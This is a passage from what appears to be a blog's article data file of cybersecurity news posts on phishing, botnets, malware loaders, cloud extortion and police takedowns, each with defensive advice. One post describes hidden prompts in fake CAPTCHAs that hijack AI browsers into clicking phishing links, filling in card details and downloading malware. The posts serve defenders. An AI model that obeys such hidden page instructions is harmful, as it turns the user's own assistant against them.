  `},{id:"gmail-phishing-attack-2025",title:"Gmail Phishing Campaign Uses Voicemail Lures & Fake Login Flows",summary:"Credential theft at scale with CAPTCHA gates, MFA prompts, and cloaked redirect chains",date:"2025-08-19",author:"EthicalByte",tags:["Phishing","Gmail","Account Security","MFA","Email Security"],imageKey:"gmailPhishVoicemailBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:#eaf6f6; border-radius:10px;">
  <h3 style="color:#006d77;">🛑 What Happened</h3><br>
  <p>
    A widespread <strong>Gmail phishing campaign</strong> has been uncovered, using convincing 
    <b>voicemail and notification emails</b> as bait to lure victims into clicking. Once engaged, 
    targets are funneled through a series of <b>redirects and CAPTCHA challenges</b>, making the 
    attack chain appear more trustworthy while simultaneously frustrating automated security scanners. 
    The final destination is a <strong>highly polished fake Google login page</strong>, 
    designed to steal credentials and bypass multi-factor authentication with alarming precision. 
    Researchers note that the scale, realism, and persistence of this campaign mark it as one of the 
    most dangerous phishing waves seen in 2025.
  </p>
</section>


    <section style="padding:20px; background:#fefae0; border-radius:10px; margin-top:14px;">
      <h3 style="color:#e76f51;">🧭 How the Attack Works</h3><br>
      <ol style="margin-left:18px;">
        <li>User receives a “new voicemail / document” email with a <em>View</em> button.</li>
        <li>Click → redirect chain (often via trusted-looking domains) → human CAPTCHA.</li>
        <li>Landing page mimics Google sign-in; steals email + password.</li>
        <li>Second screen asks for <strong>MFA code</strong> / recovery info → full account takeover.</li>
        <li>Scripts use obfuscation and anti-debugging to evade detection.</li>
      </ol>
    </section>

    <section style="padding:20px; background:#edf6f9; border-radius:10px; margin-top:14px;">
      <h3 style="color:#006d77;">🔎 Red Flags to Spot</h3><br>
      <ul style="margin-left:18px;">
        <li>“Voicemail” emails sent to roles that don’t use voicemail.</li>
        <li>Mismatched sender/display names or odd reply-to domains.</li>
        <li>Link tooltips show long redirect chains or URL shorteners.</li>
        <li>CAPTCHA before viewing a simple file/voice note.</li>
        <li>Google sign-in that doesn’t live on <strong>accounts.google.com</strong>.</li>
      </ul>
    </section>

    <section style="padding:20px; background:#fff3cd; border-radius:10px; margin-top:14px; border-left:6px solid #ff9f43;">
      <h3 style="color:#ff6f00;">🎯 Who’s at Risk & Impact</h3><br>
      <p>Anyone with a Google account—especially <strong>admins, finance, sales, and support</strong> roles targeted for payment fraud, inbox rule abuse, OAuth token theft, and data exfiltration from Drive/Workspace.</p>
    </section>

    <section style="padding:20px; background:#f0f7ff; border-radius:10px; margin-top:14px;">
      <h3 style="color:#264653;">🛡️ Mitigation Checklist</h3><br>
      <ul style="margin-left:18px;">
        <li><strong>Enforce phishing-resistant MFA</strong> (security keys / passkeys) for all users.</li>
        <li>Use a <strong>password manager</strong>—it won’t autofill on fake domains.</li>
        <li>Block link shorteners and inspect URL destinations at the secure gateway.</li>
        <li>Enable Google Workspace <strong>context-aware access</strong> & alerting on atypical sign-ins.</li>
        <li>Harden recovery options; disable SMS recovery for high-risk users.</li>
        <li>Run simulated phishing with voicemail/document lures; coach report-first behavior.</li>
      </ul>
    </section>

    <section style="padding:20px; background:#eaf6f6; border-radius:10px; margin-top:14px;">
      <h3 style="color:#006d77;">🚑 If You Clicked</h3><br>
      <ol style="margin-left:18px;">
        <li>Reset Google password immediately; revoke active sessions.</li>
        <li>Rotate/revoke <strong>OAuth app tokens</strong> under Security → Third-party access.</li>
        <li>Review Gmail filters/forwarding rules and remove anything suspicious.</li>
        <li>Turn on security keys/passkeys; audit recovery email/phone.</li>
      </ol>
    </section>

    <section style="padding:20px; text-align:center; background:#f8f9fa; border-radius:10px; margin-top:14px;">
      <h3 style="color:#2a9d8f;">📚 Share & Stay Safe</h3><br>
      <p>Verify links, use passkeys, and report suspicious emails. A 5-second URL check can save an account takeover.</p>
    </section>
  `},{id:"rapperbot-ddos-takedown-2025",title:"FBI Shuts Down ‘RapperBot’ — 95,000-Device DDoS-for-Hire Network",summary:"22-year-old built a botnet that launched 370,000+ attacks across 80 countries, peaking at 6 Tbps",date:"2025-08-20",author:"EthicalByte",tags:["DDoS","Botnet","RapperBot","FBI","Cybercrime","Mirai-Variant"],imageKey:"rapperbotDdosBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0b132b,#1c2541); color:#f1f5f9; border-radius:10px;">
      <h3 style="color:#e63946;">🛑 What Happened</h3><br>
      <p>
        U.S. authorities dismantled a massive <strong>DDoS-for-hire</strong> operation dubbed <strong>“RapperBot”</strong>, allegedly run by a <strong>22-year-old from Oregon</strong>. 
        The botnet weaponized <b>~95,000 compromised devices</b> to launch <b>370,000+</b> attacks across <b>80 countries</b>, with bursts reaching <strong>~6 Tbps</strong> — 
        enough to disrupt major platforms and ISPs.
      </p>
    </section>

    <section style="padding:20px; background:#0f172a; color:#e2e8f0; border-radius:10px; margin-top:14px; border-left:6px solid #e63946;">
      <h3 style="color:#ffb703;">⚙️ How “RapperBot” Worked</h3><br>
      <ul style="margin-left:18px;">
        <li><b>Mirai-lineage:</b> Evolved from Mirai variants with custom modules for rapid scanning and brute-forcing.</li>
        <li><b>Device targeting:</b> Mostly exposed <em>IoT/routers/NVRs</em> with weak creds or old firmware.</li>
        <li><b>Command & Control:</b> Fast-flux infra and rotating C2s to survive takedowns.</li>
        <li><b>Attack portfolio:</b> TCP/UDP floods, HTTP request storms, and reflection/amplification mixes.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1c2541,#0b132b); color:#f8fafc; border-radius:10px; margin-top:14px;">
      <h3 style="color:#00b4d8;">📈 Scale & Impact</h3><br>
      <p>
        <strong>370k+</strong> recorded attacks hit hosting providers, gaming services, fintech APIs, and regional ISPs. 
        Peak throughput near <b>6 Tbps</b> posed a real risk of collateral congestion, service brownouts, and cascading failures across peering links.
      </p>
    </section>

    <section style="padding:20px; background:#0f172a; color:#e2e8f0; border-radius:10px; margin-top:14px; border-left:6px solid #00b4d8;">
      <h3 style="color:#e63946;">🔬 Technical Notes</h3><br>
      <ul style="margin-left:18px;">
        <li><b>Rapid recruitment:</b> Continuous credential stuffing + exploitation of known CVEs in SOHO gear.</li>
        <li><b>Persistence:</b> Startup scripts & watchdogs to rejoin C2 after reboots.</li>
        <li><b>Evasion:</b> Obfuscated binaries, protocol blending, and variable packet sizes to confuse scrubbing centers.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0b132b,#1c2541); color:#f1f5f9; border-radius:10px; margin-top:14px;">
      <h3 style="color:#ffb703;">🛡️ Defensive Playbook (Do This Now)</h3><br>
      <ul style="margin-left:18px;">
        <li><strong>Edge hardening:</strong> Disable remote admin on routers/IoT; change default creds; update firmware.</li>
        <li><strong>Upstream protection:</strong> Engage ISP/clean-pipe DDoS services; pre-register <em>runbooks</em> and GRE/BGP diversion.</li>
        <li><strong>Geo/ASN rate limits:</strong> Apply adaptive throttles on API/gateway tiers during anomalies.</li>
        <li><strong>Anycast + WAF/CDN:</strong> Distribute load and filter L7 floods early.</li>
        <li><strong>Telemetries:</strong> NetFlow/sFlow, anomaly detection, and auto-block on volumetric/pps spikes.</li>
      </ul>
    </section>

    <section style="padding:20px; background:#0f172a; color:#e2e8f0; border-radius:10px; margin-top:14px; border-left:6px solid #ffb703;">
      <h3 style="color:#00b4d8;">⚖️ Takedown & Aftermath</h3><br>
      <p>
        The FBI seized C2 infrastructure and charged the alleged operator. While activity has dropped, <b>copycat clusters</b> 
        and residual nodes may persist. Expect rebrands and new loaders attempting to reclaim device footholds.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1c2541,#0b132b); color:#f8fafc; border-radius:10px; margin-top:14px;">
      <h3 style="color:#e63946;">✅ Final Thoughts</h3><br>
      <p>
        “RapperBot” is a reminder that <strong>consumer-grade devices</strong> can power internet-scale disruption. 
        Treat SOHO/IoT as critical edge infrastructure: patch fast, lock down services, and pre-plan DDoS response — 
        before the next 6 Tbps wave tests your resilience.
      </p>
    </section>
  `},{id:"ai-browser-promptfix-attack-2025",title:"PromptFix ALERT: AI Browsers Can Be Tricked by Hidden Prompts",summary:"Researchers expose how malicious CAPTCHAs can hijack AI-driven browsers like Comet.",date:"2025-08-21",author:"EthicalByte",tags:["AI","Prompt Injection","Browser Security","Cyber Threats"],imageKey:"aiBrowserPromptFix2025",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg, #0f172a, #1e293b); color:#f8fafc; border-radius:12px;">
      <h2 style="color:#f43f5e;">🛑 AI Browsers Under Attack</h2><br>
      <p>
        Security researchers have discovered that <b>AI-powered browsers</b> such as <b>Comet</b> can be manipulated 
        by hidden prompts embedded in fake <b>CAPTCHAs</b>. These invisible instructions bypass user awareness 
        and exploit the very systems designed to simplify web navigation.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg, #1e293b, #334155); border-radius:10px; color:#f1f5f9; margin-top:15px;">
      <h3 style="color:#22d3ee;">⚠️ What Can Happen</h3><br>
      <ul style="line-height:1.6; font-size:15px;">
        <li>🤖 Auto-clicks on <b>phishing links</b> hidden in sites.</li>
        <li>💳 Automatic filling of <b>credit card and personal details</b>.</li>
        <li>💻 Silent <b>malware downloads</b> triggered in the background.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg, #0f766e, #134e4a); border-radius:10px; color:white; margin-top:15px;">
      <h3 style="color:#facc15;">🔍 Why It’s Dangerous</h3><br>
      <p>
        Traditional phishing relies on tricking the user. 
        <b>Prompt injection attacks</b> flip the script by deceiving the AI itself. 
        This means that even a cautious human can be compromised if their AI browser is manipulated. 
        The automation designed to protect convenience may instead become an attacker’s weapon.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg, #3b0764, #581c87); border-radius:10px; color:#f3e8ff; margin-top:15px;">
      <h3 style="color:#c084fc;">🛡️ Defense Strategies</h3><br>
      <ul style="line-height:1.6;">
        <li>Adopt AI browsers that implement <b>prompt injection detection</b>.</li>
        <li>Restrict browser permissions for autofill and auto-clicking.</li>
        <li>Use strong <b>endpoint monitoring</b> to catch malware payloads.</li>
        <li>Regularly audit AI assistants for <b>unexpected actions</b>.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg, #111827, #1e293b); border-radius:10px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#38bdf8;">📌 Final Take</h3><br>
      <p>
        The rise of AI browsers brings speed and convenience, 
        but also a new type of cyber threat — <b>AI prompt manipulation</b>. 
        As attackers innovate with hidden instructions inside web elements, 
        defenders must rethink how security applies in the era of AI-driven browsing. 
        In short: <b>your AI assistant can be hacked, even if you aren’t.</b>
      </p>
    </section>
  `},{id:"quirkyloader-malware-campaign-2025",title:"QuirkyLoader: The New Malware Loader Fueling Cybercrime",summary:"Spreading Agent Tesla, AsyncRAT, Snake Keylogger & more across global campaigns",date:"2025-08-22",author:"EthicalByte",tags:["Malware","Threat Intelligence","Cybersecurity","Agent Tesla","Keylogger","QuirkyLoader"],imageKey:"quirkyloadermalware2025",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:10px; color:#f5f5f5;">
      <h2 style="color:#ff4d6d;">👾 QuirkyLoader: A Rising Malware Threat</h2><br>
      <p>
        A newly discovered malware loader known as <b>QuirkyLoader</b> is quickly making waves across the cybersecurity landscape. 
        Unlike traditional droppers, QuirkyLoader acts as a <b>flexible delivery platform</b>, capable of deploying well-known threats 
        such as <b>Agent Tesla</b>, <b>AsyncRAT</b>, <b>Snake Keylogger</b>, and more. 
        Its rise highlights just how adaptive and industrialized the malware economy has become.
      </p>
      <p>
        Researchers report that the loader has already been used in <b>high-profile campaigns</b>, including one where attackers 
        targeted a <b>Taiwan-based cybersecurity company</b>. The malicious payloads in this campaign were designed 
        to steal sensitive data — from login credentials to keystrokes — showing that even security firms themselves 
        are not immune to advanced attacks.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:10px; color:#fff;">
      <h3 style="color:#ffd166;">🚨 How QuirkyLoader Works</h3><br>
      <p>
        What makes QuirkyLoader especially dangerous is its ability to <b>bypass defenses</b> and deliver malware directly into memory, 
        avoiding traditional detection methods. Threat actors are spreading it through <b>phishing campaigns</b>, 
        malicious email attachments, and cracked software downloads, ensuring it reaches both corporate and personal systems worldwide.
      </p>
      <p>
        This loader isn’t tied to one purpose — it’s a <b>gateway</b>. Once inside a system, attackers can load spyware, 
        keyloggers, or even full-scale remote access trojans. This flexibility gives cybercriminals the power to pivot 
        between <b>financial fraud, espionage, and credential theft</b> in a single campaign.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:10px; color:#e0e0e0;">
      <h3 style="color:#06d6a0;">🕵️ Real-World Impact</h3><br>
      <p>
        The growing adoption of QuirkyLoader is a warning sign for defenders. 
        Attackers no longer need to create full malware families — loaders like this let them 
        <b>plug-and-play malicious payloads</b> with minimal effort. 
      </p>
      <p>
        Security researchers warn that its popularity could trigger a surge in <b>multi-malware campaigns</b>, 
        where several spyware and RAT families are dropped together for maximum disruption.
      </p>
    </section><br>

    <section style="padding:20px; background:#f8f9fa; border-radius:10px; color:#333;">
      <h3 style="color:#118ab2;">🛡 Mitigation Strategies</h3><br>
      <p>
        Protecting against QuirkyLoader requires a <b>layered defense strategy</b>. 
        Companies must patch systems regularly, but that’s just the start. 
        Deploying <b>EDR solutions</b> that can detect memory injections, 
        monitoring login anomalies, and blocking malicious domains are essential.
      </p>
      <p>
        Just as important, <b>user awareness training</b> remains critical, 
        since phishing emails are one of the main distribution methods for QuirkyLoader.
      </p>
    </section><br>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:10px; color:#fff;">
      <h3 style="color:#ff4d6d;">⚡ Final Thoughts</h3><br>
      <p>
        <b>QuirkyLoader</b> isn’t just another piece of malware — it’s a platform for cybercriminals to innovate on. 
        By offering flexibility and stealth, it lowers the barrier for launching advanced attacks at scale. 
        Defenders must scale their vigilance to match this threat, or risk becoming the next headline breach.
      </p>
    </section>
  `},{id:"interpol-operation-serengeti-2025",title:"Operation Serengeti: 1,209 Cybercriminals Arrested Across 18 African Countries",summary:"INTERPOL’s multi-nation sweep dismantles 11,432 malicious infrastructures and recovers $97.4M",date:"2025-08-23",author:"EthicalByte",tags:["INTERPOL","Cybercrime","Fraud","Ransomware","Law Enforcement","Africa"],imageKey:"operationSerengetiBanner",content:`
     <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:10px; color:#f5f5f5;">
      <h2 style="color:#ff4d6d;">🛑 Operation Serengeti: A Coordinated Strike</h2><br>
      <p>
        INTERPOL’s <b>Operation Serengeti</b> executed a sweeping, multi-nation crackdown on organized cybercrime
        across <b>18 African countries</b>. Over the course of the action, authorities <b>arrested 1,209 suspects</b>,
        recovered <b>$97.4 million</b> linked to online fraud, identified <b>88,000 victims</b>, and dismantled
        <b>11,432 malicious infrastructures</b> ranging from phishing farms and mule networks to ransomware enablement nodes.
        The operation underscores how coordinated policing can disrupt cybercrime-as-a-service at scale.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:10px; color:#ffffff;">
      <h3 style="color:#ffd166;">🌍 What the Crackdown Targeted</h3><br>
      <p>
        Serengeti hit the full spectrum of digital crime: <b>crypto investment scams</b>, <b>business email compromise (BEC)</b>,
        <b>romance fraud</b>, <b>account takeover rings</b>, and <b>ransomware facilitation</b>. Investigators focused on both
        front-end lures—spoofed brands, fake exchanges, and phishing portals—and back-end monetization chains that laundered
        stolen funds through cash-out networks and crypto mixers. By striking infrastructure and operators simultaneously,
        the operation aimed to break repeatability, not just deliver short-term arrests.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:10px; color:#e0e0e0;">
      <h3 style="color:#06d6a0;">🔍 How the Machinery Worked</h3><br>
      <p>
        The takedown leaned on <b>intelligence sharing</b> across national police, financial intelligence units, and private
        security teams. Indicators of compromise, mule account patterns, and domain/link telemetry fed rapid deconfliction,
        enabling coordinated seizures and arrests. Disruptions included <b>sinkholing command domains</b>, freezing
        <b>fraud-linked wallets and bank accounts</b>, and executing warrants on call centers orchestrating mass outreach
        via email and SMS. The result: an immediate reduction in active campaigns and increased friction for reconstitution.
      </p>
    </section><br>

    <section style="padding:20px; background:#f8f9fa; border-radius:10px; color:#333333;">
      <h2 style="color:#118ab2;">🏢 Why This Matters for Organizations</h2><br>
      <p>
        Serengeti is a proof point that <b>ecosystem-level pressure</b> works—but criminal supply chains adapt quickly.
        For enterprises, the lesson is clear: treat fraud and BEC as <b>operational risks</b>, not just IT issues.
        Reduce blast radius with least-privilege email permissions, enforce <b>phishing-resistant MFA</b> on finance and
        executive accounts, and route vendor and payment changes through <b>dual-control, out-of-band verification</b>.
        Feed law-enforcement advisories and threat intel into <b>SIEM/EDR blocklists</b> to capitalize on post-operation indicators.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:10px; color:#ffffff;">
      <h3 style="color:#ff4d6d;">🛡 Practical Next Steps</h3><br>
      <p>
        Tighten the basics that criminals continually exploit: <b>DMARC/DKIM/SPF</b> to blunt spoofing, banner warnings on
        external mail, and <b>automated reporting</b> to security when users flag suspicious messages. Run <b>scenario-based
        drills</b> around invoice fraud, payroll redirection, and crypto “recovery” scams so teams recognize social cues,
        not just malicious links. For finance and AP, require <b>callback verification</b> to known numbers, never the
        ones supplied in the request. Finally, pre-stage <b>response playbooks</b>—legal, banking contacts, takedown processes—
        so hours aren’t lost when minutes matter.
      </p>
    </section><br>

    <section style="padding:20px; background:#0f172a; border-radius:10px; color:#e2e8f0; text-align:center;">
      <h3 style="color:#ffd166;">✅ Final Take</h3><br>
      <p>
        Operation Serengeti is a rare, large-scale win for defenders. The message for organizations: leverage the momentum—
        adopt the shared indicators, close the easy doors, and rehearse the workflows. Cybercrime thrives on inertia; deny it.
      </p>
    </section>
  `},{id:"linux-filename-malware-2025",title:"Linux Malware Hidden in Filenames: Phishing RAR Trick Exposed",summary:"Attackers can hijack systems using nothing more than a malicious file name.",date:"2025-08-25",author:"EthicalByte",tags:["Linux","Phishing","Malware","RAR","Cybersecurity"],imageKey:"linuxFilenameMalwareBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1f2937); color:#f5f5f5; border-radius:12px;">
      <h3 style="color:#ef4444;">🛑 What Happened</h3><br>
      <p>
        Researchers have uncovered a dangerous new technique in the wild: phishing emails carrying 
        <strong>RAR archive files</strong> that can <b>infect Linux systems without opening any file content</b>. 
        The malware isn’t hidden in macros, scripts, or binaries — instead, it’s buried <b>inside the file name itself</b>.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1f2937,#0f172a); border-radius:12px; color:#e5e7eb; margin-top:15px;">
      <h3 style="color:#facc15;">⚙️ How the Attack Works</h3><br>
      <p>
        The RAR archive contains files with <b>specially crafted names</b> that embed malicious Bash commands. 
        When the archive is extracted, Linux interprets the filename as code, triggering execution without any 
        user interaction. 
      </p>
      <p>
        ✔️ No need to run executables  
        ✔️ No macros or embedded payloads  
        ✔️ Just an extraction process that silently executes commands
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#0f766e,#134e4a); border-radius:12px; color:#f0fdfa; margin-top:15px;">
      <h3 style="color:#34d399;">🚨 Why It’s Dangerous</h3><br>
      <p>
        This technique bypasses traditional <b>antivirus scans</b> and signature-based defenses. 
        Since there’s no “hidden content,” scanners often mark the file as safe. 
        In reality, the danger lies in how the <b>Linux shell parses filenames</b>. 
        With attackers getting creative, even seasoned sysadmins could fall victim.
      </p>
    </section><br>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ How to Stay Safe</h3><br>
      <ul style="line-height:1.8; margin-left:18px;">
        <li>🚫 Never extract archives from untrusted emails.</li>
        <li>🔒 Use sandbox environments for suspicious files.</li>
        <li>⚙️ Configure Linux to prevent execution of filenames containing commands.</li>
        <li>🧩 Deploy behavior-based detection, not just signature AV.</li>
        <li>👥 Train staff to identify phishing lures with “urgent” attachments.</li>
      </ul>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1f2937,#111827); border-radius:12px; color:#f5f5f5; text-align:center; margin-top:15px;">
      <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        The discovery of <b>malware hidden in filenames</b> marks a dangerous evolution in phishing attacks. 
        It’s a reminder that attackers will always find creative ways to turn the simplest elements 
        — like a file name — into an execution vector. 
        Defenders must step up with layered defenses, sandboxing, and proactive monitoring.
      </p>
    </section>
  `},{id:"upcrypter-phishing-campaign-2025",title:"UpCrypter: Stealthy Loader Powering a New Global Phishing Wave",summary:"Fake voicemails and purchase orders funnel victims into RAT takeovers — PureHVNC, DarkCrystal and more",date:"2025-08-26",author:"EthicalByte",tags:["Phishing","Malware Loader","UpCrypter","RAT","PureHVNC","DarkCrystal"],imageKey:"upcrypterPhishingBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:10px; color:#f5f5f5;">
      <h3 style="color:#ff4d6d;">🚨 A New Phishing Wave</h3><br>
      <p>
        A fresh phishing wave is circulating across multiple industries, weaponizing believable <b>voicemail</b> and <b>purchase order</b> lures to deliver a stealthy loader known as <b>UpCrypter</b>. 
        Unlike noisy droppers, UpCrypter focuses on quietly establishing footholds and then handing control to remote access trojans (RATs) such as <b>PureHVNC</b> and <b>DarkCrystal</b>. 
        The endgame is simple and dangerous: persistent, hands-on-keyboard control over compromised endpoints.
      </p>
      <p>
        Campaign telemetry shows broad targeting — finance, manufacturing, IT services, and regional supply chains — with carefully crafted emails that mirror real business workflows. 
        Attachments and links are staged through redirect chains to evade filters, landing victims on convincingly branded pages or prompting them to open “routine” documents.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:10px; color:#ffffff; margin-top:14px;">
      <h3 style="color:#ffd166;">⚙️ How UpCrypter Works</h3><br>
      <p>
        UpCrypter’s value to attackers is its <b>modular delivery</b>. After initial execution, the loader decrypts and deploys payloads in memory to reduce disk artifacts, then beacons to command-and-control for tasking. 
        Operators can rotate in different RATs — screen control, credential theft, cookie/session hijacking — or chain in info-stealers depending on the target environment and the data they want.
      </p>
      <p>
        By separating the “loader” from the “payload,” adversaries gain resilience. If a RAT gets detected and removed, the loader can simply fetch a new build, switch infrastructure, and continue the intrusion with minimal friction.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:10px; color:#e0e0e0; margin-top:14px;">
      <h3 style="color:#06d6a0;">🕵️ Real-World Impact</h3><br>
      <p>
        The operational impact is significant. RATs delivered by UpCrypter support <b>invisible desktop sessions</b> for fraudulent transactions, data staging from file shares and browsers, and the planting of persistence for later return. 
        In supply-chain contexts, a single phished endpoint can become a beachhead to vendor portals, ERP systems, and billing workflows — amplifying both financial and reputational risk.
      </p>
      <p>
        This loader-first model also accelerates <b>campaign scale</b>: a small team can run many concurrent intrusions by automating lure distribution while reserving human operators for lucrative targets that show signs of access to finance or admin tooling.
      </p>
    </section><br>

    <section style="padding:20px; background:#f8f9fa; border-radius:10px; color:#333333; margin-top:14px;">
      <h3 style="color:#118ab2;">🛡 Mitigation & Defense</h3><br>
      <p>
        Defending against UpCrypter demands <b>layered controls</b> rather than a single silver bullet. Harden email ingress with attachment detonation and URL rewriting; flag voicemail/purchase-order themes with anomaly scoring; and enforce least-privilege on endpoints to limit post-compromise actions. 
        Endpoint detection and response (EDR) should monitor for memory-only loaders, suspicious child processes from office/PDF apps, and atypical remote desktop artifacts.
      </p>
      <p>
        On the human side, prioritize <b>scenario-based training</b> around finance and procurement lures, and institute out-of-band verification for urgent payment or document requests. Rapid response playbooks — token/session revocation, credential rotation, and host isolation — shorten attacker dwell time when prevention fails.
      </p>
    </section><br>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:10px; color:#ffffff; margin-top:14px;">
      <h3 style="color:#ff4d6d;">✅ Final Thoughts</h3><br>
      <p>
        <b>UpCrypter</b> underscores the evolution of phishing: from simple credential theft to <b>loader-driven remote control</b>. 
        Treat unexpected voicemails and purchase orders as high-risk events, and tune defenses for loader behaviors — because one click now buys an adversary a seat at your keyboard.
      </p>
    </section>
  `},{id:"storm0501-cloud-ransomware-2025",title:"Storm-0501: Ransomware Without the Ransomware",summary:"Hackers no longer need encryption — cloud account takeover is the new extortion model.",date:"2025-08-28",author:"EthicalByte",tags:["Ransomware","Cloud Security","Microsoft Teams","Storm-0501","Identity Theft"],imageKey:"storm0501CloudTakeoverBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0f172a,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ef4444;">🔑 A New Kind of Ransomware</h3><br>
      <p>
        Forget malware. Forget encryption. <b>Storm-0501</b>, a sophisticated threat actor, has changed the game with 
        a cloud-first extortion model that doesn’t deploy traditional ransomware at all. 
        Instead of locking files, they go after your <b>cloud identity</b> — hijacking accounts, stealing data, 
        erasing backups, and then demanding ransom directly over <b>Microsoft Teams</b>.
      </p>
      <p>
        This approach strips away the noisy malware artifacts defenders typically look for. 
        No malicious executables. No suspicious encryption processes. Just legitimate cloud sessions — 
        repurposed by attackers into a weapon.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e5e7eb; margin-top:15px;">
      <h3 style="color:#facc15;">⚙️ How Storm-0501 Pulls It Off</h3><br>
      <p>
        The attackers focus on <b>identity compromise</b> rather than endpoint malware. 
        By exploiting misconfigured or stolen <b>Microsoft Entra ID</b> credentials, 
        they gain full access to enterprise cloud tenants. From there, the playbook unfolds:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🛠 Hijack administrator accounts for maximum privileges</li>
        <li>📂 Steal sensitive corporate data stored in OneDrive, SharePoint, and Outlook</li>
        <li>🗑️ Delete cloud backups and version histories to remove recovery options</li>
        <li>💬 Deliver ransom notes directly via <b>Microsoft Teams messages</b></li>
      </ul>
      <p>
        All of this occurs through cloud-native activity — blending in with normal user behavior, 
        making detection exceptionally difficult.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f766e,#134e4a); border-radius:12px; color:#f0fdfa; margin-top:15px;">
      <h3 style="color:#34d399;">🚨 Why It’s Dangerous</h3><br>
      <p>
        Traditional ransomware leaves behind obvious signs — encryption extensions, ransom notes on disk, 
        broken workflows. Storm-0501 leaves <b>almost no local footprint</b>. 
        By living entirely in the cloud, they sidestep many endpoint security tools. 
      </p>
      <p>
        Even worse: victims can’t simply restore from backups, because attackers <b>delete or corrupt them first</b>. 
        The extortion hits harder when recovery options are off the table.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ How Organizations Can Defend</h3><br>
      <p>
        Defending against this new breed of ransomware requires a shift in mindset: 
        <b>identity is the new perimeter</b>. 
        Organizations should:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Enforce strong <b>MFA</b> across all accounts</li>
        <li>✔️ Monitor Entra ID sign-ins for unusual geolocation or device changes</li>
        <li>✔️ Enable <b>conditional access policies</b> to block risky login attempts</li>
        <li>✔️ Regularly test <b>backup and restore processes</b> to ensure they’re tamper-resistant</li>
        <li>✔️ Educate employees about <b>social engineering</b> used to steal credentials</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#0f172a); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        <b>Storm-0501</b> proves that ransomware doesn’t need to encrypt files to be effective. 
        By taking over cloud environments and weaponizing legitimate platforms like Teams, 
        attackers are rewriting the extortion playbook. 
        It’s a wake-up call: cloud identity is now the crown jewel — and it must be defended accordingly.
      </p>
    </section>
  `},{id:"tamperedchef-malware-2025",title:"TamperedChef: Fake PDF Editor Malware Campaign",summary:"A Google Ads hijack leads users to info-stealing malware disguised as a PDF tool.",date:"2025-08-29",author:"EthicalByte",tags:["TamperedChef","Malware","InfoStealer","Google Ads","Cybercrime"],imageKey:"tamperedchefMalwareBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ef4444;">🚨 The Discovery</h3><br>
      <p>
        Security researchers have uncovered a malicious campaign abusing <b>Google Ads</b> to push a 
        <b>fake PDF editor</b>. Behind the installer hides <b>TamperedChef</b>, 
        a new info-stealing malware designed for <b>long-term stealth and data theft</b>.
      </p>
      <p>
        Unlike common info-stealers, TamperedChef doesn’t strike immediately. 
        It waited up to <b>56 days</b> before activating — bypassing detection and raising 
        the chances that victims would trust and use the compromised software regularly.
      </p>
    </section><br>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#facc15;">⚙️ How TamperedChef Works</h3><br>
      <p>
        The infection chain begins when users click a <b>Google ad</b> for a legitimate-looking PDF editor. 
        Instead of downloading the real application, they receive a <b>tampered installer</b> seeded with malware.
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
